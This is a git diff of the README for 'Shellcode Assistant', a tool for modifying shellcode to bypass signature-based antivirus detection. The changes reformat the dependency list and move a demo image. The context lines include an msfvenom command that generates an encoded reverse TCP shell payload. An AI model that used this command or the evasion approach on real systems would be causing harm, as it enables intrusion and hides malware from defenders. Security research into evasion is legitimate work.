@@ -10,17 +10,12 @@ This tool is designed to make the process of altering shellcode to bypass **sign
 
 The script also provides an **interactive command line interface**, similar to Metasploit's nasm-shell, for assembling and disassembling instructions. It does this using the Capstone and Keystone libraries.
 
-## Requirements
-
-Python 3 (≥ 3.5)
-
-Capstone
-
-Keystone
-
-Libemu
-
-gcc
+## Dependencies
+* Python 3 (≥ 3.5)
+* Capstone
+* Keystone
+* Libemu
+* gcc
 
 ## Setup
 
@@ -81,6 +76,10 @@ root@kali:~/OT-Project# python3 shellcode_assistant.py -f testing.bin -A -s "Hel
 root@kali:~/OT-Project# python3 shellcode_assistant.py -f testing.bin -R
 ```
 
+### Demo - Modifying Shikata Ga Nai Encoded 'Hello World' Shellcode
+
+<img title="" src="https://raw.githubusercontent.com/alexander-47u/Shellcode-Assistant/master/demo.gif" width="1000px" height="565" alt="" data-align="center">
+
 ### ASM Interactive Assembler / Dissassembler
 
 ```
@@ -126,10 +125,6 @@ echo -e "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x68\x72\x6c\x64\x0a\x68\x6
 ```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw -b "\x00" -e x86/shikata_ga_nai -o testing.bin
 ```
-
-### Demo - Modifying Shikata Ga Nai Encoded 'Hello World' Shellcode
-
-<img title="" src="https://raw.githubusercontent.com/alexander-47u/Shellcode-Assistant/master/demo.gif" width="1000px" height="565" alt="" data-align="center">
 
 ## Authors
 
